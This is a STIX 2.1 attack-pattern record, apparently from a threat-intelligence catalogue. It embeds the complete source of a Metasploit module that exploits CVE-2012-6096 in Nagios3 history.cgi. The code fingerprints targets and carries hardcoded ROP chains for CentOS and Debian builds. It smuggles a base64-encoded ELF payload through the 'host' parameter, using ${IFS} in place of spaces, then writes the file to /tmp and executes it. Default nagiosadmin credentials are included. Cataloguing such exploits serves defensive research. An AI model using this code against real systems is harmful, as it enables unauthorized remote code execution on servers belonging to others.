{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ac2962b-a62b-4235-bc37-342de729ead7",
    "created": "2024-08-14T17:13:34.232267Z",
    "modified": "2024-08-14T17:13:34.232271Z",
    "name": "Nagios3 history.cgi Host Command Execution",
    "description": " This module abuses a command injection vulnerability in the Nagios3 history.cgi script. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/nagios3_history_cgi.rb",
            "external_id": "nagios3_history_cgi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6096"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nagios3 history.cgi Host Command Execution',\n      'Description'    => %q{\n          This module abuses a command injection vulnerability in the\n        Nagios3 history.cgi script.\n      },\n      'Author'         => [\n        'Unknown <temp66[at]gmail.com>',\t\t    # Original finding\n        'blasty <blasty[at]fail0verflow.com>',\t    # First working exploit\n        'Jose Selvi <jselvi[at]pentester.es>',\t    # Metasploit module\n        'Daniele Martini <cyrax[at]pkcrew.org>'\t# Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6096' ],\n          [ 'OSVDB', '88322' ],\n          [ 'BID', '56879' ],\n          [ 'EDB', '24084' ]\n        ],\n      'Platform'       => %w{ linux unix },\n      'Arch'           => [ ARCH_X86 ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 200,\t# Due to a system() parameter length limitation\n          'BadChars'    => '',\t# It'll be base64 encoded\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { 'auto' => true }],\n          # NOTE: All addresses are from the history.cgi binary\n          [ 'Appliance Nagios XI 2012R1.3 (CentOS 6.x)',\n            {\n              'BannerRE' => 'Apache/2.2.15 (CentOS)',\n              'VersionRE' => '3.4.1',\n              'Arch' => ARCH_X86,\n              'Offset' => 0xc43,\n              'RopStack' =>\n                [\n                  0x0804c260,\t# unescape_cgi_input()\n                  0x08048f04,\t# pop, ret\n                  0x08079b60,\t# buffer addr\n                  0x08048bb0,\t# system()\n                  0x08048e70,\t# exit()\n                  0x08079b60\t# buffer addr\n                ]\n            }\n          ],\n          [ 'Debian 5 (nagios3_3.0.6-4~lenny2_i386.deb)',\n            {\n              'BannerRE' => 'Apache/2.2.9 (Debian)',\n              'VersionRE' => '3.0.6',\n              'Arch' => ARCH_X86,\n              'Offset' => 0xc37,\n              'RopStack' =>\n                [\n                  0x0804b620,\t# unescape_cgi_input()\n                  0x08048fe4,\t# pop, ret\n                  0x080727a0,\t# buffer addr\n                  0x08048c7c,\t# system()\n                  0xdeafbabe,\t# if should be exit() but it's not\n                  0x080727a0\t# buffer addr\n                ]\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-12-09'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"The full URI path to history.cgi\", \"/nagios3/cgi-bin/history.cgi\"]),\n        OptString.new('USER', [true, \"The username to authenticate with\", \"nagiosadmin\"]),\n        OptString.new('PASS', [true, \"The password to authenticate with\", \"nagiosadmin\"]),\n      ])\n  end\n\n  def detect_version(uri)\n    # Send request\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => uri,\n      'headers'   => { 'Authorization' => 'Basic ' + Rex::Text.encode_base64(\"#{datastore['USER']}:#{datastore['PASS']}\") },\n    }, 10)\n\n    # Error handling\n    if res.nil?\n      print_error(\"Unable to get a response from the server\")\n      return nil, nil\n    end\n    if(res.code == 401)\n      print_error(\"Please specify correct values for USER and PASS\")\n      return nil, nil\n    end\n    if(res.code == 404)\n      print_error(\"Please specify the correct path to history.cgi in the URI parameter\")\n      return nil, nil\n    end\n\n    # Extract banner from response\n    banner = res.headers['Server']\n\n    # Extract version from body\n    version = nil\n    version_line = res.body.match(/Nagios&reg; (Core&trade; )?[0-9.]+ -/)\n    if not version_line.nil?\n      version = version_line[0].match(/[0-9.]+/)[0]\n    end\n\n    # Check in an alert exists\n    alert = res.body.match(/ALERT/)\n\n    return version, banner, alert\n  end\n\n  def select_target(version, banner)\n\n    # No banner and version, no target\n    if banner.nil? or version.nil?\n      return nil\n    end\n\n    # Get version information\n    print_status(\"Web Server banner: #{banner}\")\n    print_status(\"Nagios version detected: #{version}\")\n\n    # Try regex for each target\n    self.targets.each do |t|\n      if t['BannerRE'].nil? or t['VersionRE'].nil?  # It doesn't exist in Auto Target\n        next\n      end\n      regexp1 = Regexp.escape(t['BannerRE'])\n      regexp2 = Regexp.escape(t['VersionRE'])\n      if ( banner =~ /#{regexp1}/ and version =~ /#{regexp2}/ ) then\n        return t\n      end\n    end\n    # If not detected, return nil\n    return nil\n  end\n\n  def check\n    print_status(\"Checking banner and version...\")\n    # Detect version\n    banner, version, alert = detect_version(target_uri.path)\n    # Select target\n    mytarget = select_target(banner, version)\n\n    if mytarget.nil?\n      vprint_error(\"No matching target\")\n      return CheckCode::Unknown\n    end\n\n    if alert.nil?\n      vprint_error(\"At least one ALERT is needed in order to exploit\")\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Appears\n  end\n\n  def exploit\n    # Automatic Targeting\n    mytarget = nil\n    banner, version, alert = detect_version(target_uri.path)\n    if (target['auto'])\n      print_status(\"Automatically detecting the target...\")\n      mytarget = select_target(banner, version)\n      if mytarget.nil?\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n    else\n      mytarget = target\n    end\n\n    print_status(\"Selected Target: #{mytarget.name}\")\n    if alert.nil?\n      print_error(\"At least one ALERT is needed in order to exploit, none found in the first page, trying anyway...\")\n    end\n    print_status(\"Sending request to http://#{rhost}:#{rport}#{target_uri.path}\")\n\n    # Generate a payload ELF to execute\n    elfbin = generate_payload_exe\n    elfb64 = Rex::Text.encode_base64(elfbin)\n\n    # Generate random filename\n    tempfile = '/tmp/' + rand_text_alphanumeric(10)\n\n    # Generate command-line execution\n    if mytarget.name =~ /CentOS/\n      cmd = \"echo #{elfb64}|base64 -d|tee #{tempfile};chmod 700 #{tempfile};rm -rf #{tempfile}|#{tempfile};\"\n    else\n      cmd = \"echo #{elfb64}|base64 -d|tee #{tempfile} |chmod +x #{tempfile};#{tempfile};rm -f #{tempfile}\"\n    end\n    host_value = cmd.gsub!(' ', '${IFS}')\n\n    # Generate 'host' parameter value\n    padding_size = mytarget['Offset'] - host_value.length\n    host_value << rand_text_alphanumeric( padding_size )\n\n    # Generate ROP\n    host_value << mytarget['RopStack'].pack('V*')\n\n    # Send exploit\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => target_uri.path,\n      'headers'   => { 'Authorization' => 'Basic ' + Rex::Text.encode_base64(\"#{datastore['USER']}:#{datastore['PASS']}\") },\n      'vars_get' =>\n      {\n        'host' => host_value\n      }\n    })\n\n    if not res\n      if session_created?\n        print_status(\"Session created, enjoy!\")\n      else\n        print_error(\"No response from the server\")\n      end\n      return\n    end\n\n    if res.code == 401\n      fail_with(Failure::NoAccess, \"Please specify correct values for USER and PASS\")\n    end\n\n    if res.code == 404\n      fail_with(Failure::NotFound, \"Please specify the correct path to history.cgi in the TARGETURI parameter\")\n    end\n\n    print_status(\"Unknown response #{res.code}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-09",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}